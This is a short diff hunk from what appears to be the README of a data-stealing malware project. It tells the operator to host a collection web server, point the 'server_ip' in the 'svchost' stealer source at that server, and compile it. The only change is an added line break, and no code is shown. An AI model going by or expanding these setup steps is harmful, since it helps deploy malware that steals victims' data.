@@ -25,7 +25,7 @@
 - Just put the "web server" folder content in your own web server folder with PDO and Sqlite installed<br>
 <br>
 - In the "svchost - source code" folder, which is the stealer source code, modify the "server_ip" in Main function to your own web server IP address<br>
-- Then compile it with Visual Studio Code with the following command line :<br>
+- Then compile it with Visual Studio Code with the following command line :<br><br>
 
 
 ```python
